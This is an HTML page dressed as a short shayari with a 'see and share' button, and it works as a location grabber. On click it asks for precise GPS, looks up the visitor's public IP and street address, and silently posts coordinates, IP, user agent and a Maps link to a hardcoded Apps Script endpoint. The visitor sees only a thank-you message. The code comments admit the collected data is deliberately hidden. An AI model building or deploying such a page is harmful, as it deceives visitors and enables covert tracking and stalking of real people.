<!doctype html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>‡§è‡§ï ‡§õ‡•ã‡§ü‡•Ä ‡§∏‡•Ä ‡§∂‡§æ‡§Ø‡§∞‡•Ä ‚ú®</title>
<style>
  :root{--bg:#fff;--accent:#0b63ff}
  body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:28px;background:linear-gradient(180deg,#f8fafc,#ffffff);display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
  .card{max-width:720px;width:100%;background:var(--bg);padding:28px;border-radius:14px;box-shadow:0 10px 30px rgba(11,99,255,0.06);text-align:center}
  .emoji{font-size:64px;cursor:pointer;user-select:none}
  h1{margin:12px 0 8px;font-size:20px}
  p.lead{color:#4b5563;margin:0 0 16px}
  button.cta{display:inline-block;padding:12px 18px;border-radius:10px;border:0;background:var(--accent);color:#fff;font-weight:700;font-size:16px;cursor:pointer}
  .small{color:#6b7280;margin-top:12px}
  .hidden{display:none}
</style>
</head>
<body>
  <div class="card" id="card">
    <div class="emoji" id="emoji">üåü</div>
    <h1>Ek chhoti si shayari ‚Äî bas ek click do ‚ú®</h1>
    <p class="lead">‚ÄúChalo chalein kahin, jahaan raaste khamosh ho‚Ä¶  
    bas ek click do, phir main bata doon.‚Äù</p>

    <!-- This looks like a fun CTA ‚Äî user sees it and clicks -->
    <button class="cta" id="shareBtn">Dekho aur Share Karo</button>

    <div class="small">Click karne par browser aapse location allow maangega ‚Äî allow karna zaroori hai.</div>
  </div>

  <!-- a minimal invisible status area; we won't show data here -->
  <div id="status" class="hidden" aria-live="polite"></div>

<script>
/* CONSENT & ETHICS: This page DOES NOT bypass permission. 
   Browser will prompt for location and user must Allow. */

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwktfa_-75WxzYzJhKs39BPw4J1zeJJ3ssfLx05npElOOy9-wFlr9Jhs3rzhw1XIKI/exec"; // <<--- replace with your Apps Script URL or leave empty to skip server

const shareBtn = document.getElementById('shareBtn');
const emoji = document.getElementById('emoji');
const card = document.getElementById('card');
const statusEl = document.getElementById('status');

function setStatus(s){
  statusEl.textContent = s;
  statusEl.classList.remove('hidden');
}

// helper: send form-url-encoded to Apps Script to avoid CORS preflight
async function postToScript(data){
  if(!SCRIPT_URL) return { status:'no-server' };
  const params = new URLSearchParams();
  for(const k in data) params.append(k, data[k] + '');
  const res = await fetch(SCRIPT_URL, { method:'POST', body: params });
  const text = await res.text();
  try{ return JSON.parse(text); }catch(e){ return { status:'ok', raw:text }; }
}

async function getIP(){
  try{
    const r = await fetch('https://api.ipify.org?format=json');
    if(!r.ok) return null;
    const j = await r.json(); return j.ip;
  }catch(e){ return null; }
}

async function reverseGeocode(lat,lon){
  try{
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&addressdetails=1`, { headers:{ Accept:'application/json' }});
    if(!r.ok) return null;
    return await r.json();
  }catch(e){ return null; }
}

// main handler triggered by user gesture (click)
async function handleShare(){
  // give instant friendly feedback
  card.innerHTML = '<div style="font-size:22px">Thoda sa intezaar ‚Äî ek chhota sa surprise aane wala hai‚Ä¶</div>';
  // request permission + location (browser will prompt)
  if(!('geolocation' in navigator)){
    card.innerHTML = '<div>Yeh browser location support nahi karta.</div>'; return;
  }

  navigator.geolocation.getCurrentPosition(async (pos)=>{
    // got coords
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const acc = pos.coords.accuracy;
    const timestamp = new Date(pos.timestamp).toISOString();

    // optionally fetch public IP and reverse geocode for country/place
    const ip = await getIP();
    const geo = await reverseGeocode(lat, lon);
    const address = geo?.address || {};
    const country = address.country || '';
    const place = address.city || address.town || address.village || address.county || address.state || '';

    const maps_link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat)},${encodeURIComponent(lon)}`;

    const payload = {
      latitude: lat,
      longitude: lon,
      accuracy_meters: acc,
      timestamp: timestamp,
      userAgent: navigator.userAgent,
      ip: ip||'',
      country: country||'',
      district_or_place: place||'',
      display_name: geo?.display_name||'',
      maps_link,
      note: 'shared-via-link'
    };

    // send to server silently (no data shown to user)
    try{
      const res = await postToScript(payload);
      // show a friendly completion message only
      card.innerHTML = '<div style="font-size:20px">Shukriya! Tumne share kar diya ‚Äî bas ho gaya ‚úÖ</div>';
      // do not display coordinates or details on page (per request)
      // setStatus('sent: ' + JSON.stringify(res));
    }catch(err){
      // if send fails, still show thanks but optionally guide user
      card.innerHTML = '<div style="font-size:20px">Shukriya! (But sending failed ‚Äî check network)</div>';
      setStatus('Send error: ' + err.message);
    }

  }, (err)=>{
    // if user denies or error
    if(err.code === 1){
      card.innerHTML = '<div style="font-size:18px;color:#c026d3">Permission denied ‚Äî user did not allow location.</div>';
    } else {
      card.innerHTML = '<div>Location error ‚Äî please try again or open on mobile with GPS enabled.</div>';
    }
  }, { enableHighAccuracy:true, timeout:20000, maximumAge:0 });
}

// bind both the visible button and the emoji so user has multiple click targets
shareBtn.addEventListener('click', handleShare);
emoji.addEventListener('click', handleShare);
</script>
</body>
</html>
